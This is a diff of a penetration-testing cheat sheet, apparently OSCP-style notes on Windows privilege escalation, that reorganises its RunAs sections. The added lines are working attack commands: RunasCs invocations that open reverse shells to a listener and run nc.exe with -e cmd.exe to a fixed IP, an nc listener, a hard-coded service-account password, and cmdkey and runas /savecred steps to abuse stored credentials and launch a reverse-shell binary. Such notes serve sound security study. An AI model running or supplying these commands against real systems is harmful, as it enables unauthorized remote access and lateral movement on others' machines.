@@ -51,11 +51,23 @@ Seatbelt.exe -group=all -full
 
 powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1
 ```
-### Gain Interactive Shell after add user to local Administrator group
+### RunAs
 Require GUI access
 ```
 1. runas /user:backupadmin cmd
 2. open cmd as admin, input dave2 password
+```
+Runascs to lateral move
+```
+runascs.exe username password powershell.exe -r lhost:lport
+nc -nlvp 7777
+RunasCs.exe svc_mssql trustno1 "C:\xampp\htdocs\uploads\nc.exe 192.168.45.167 4444 -e cmd.exe"
+```
+Savedcreds
+```
+cmdkey /list #Displays stored credentials looks for any optential users
+#Transfer the reverseshell
+runas /savecred /user:admin C:\Temp\reverse.exe
 ```
 ### Powershell Script Block Logging
 ![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/9c355e20-e841-4c1e-b384-9e53f05aaaa2)
@@ -504,12 +516,6 @@ impacket-secretsdump -ntds /home/kali/Desktop/Active\ Directory/ntds.dit -system
 ### Check Compressed files
 ```
 check zip,gz,7z,stix,rar files
-```
-### Runascs to lateral move 
-```
-runascs.exe username password powershell.exe -r lhost:lport
-nc -nlvp 7777
-RunasCs.exe svc_mssql trustno1 "C:\xampp\htdocs\uploads\nc.exe 192.168.45.167 4444 -e cmd.exe"
 ```
 ### Powershell to get interactive shell as another user
 ```
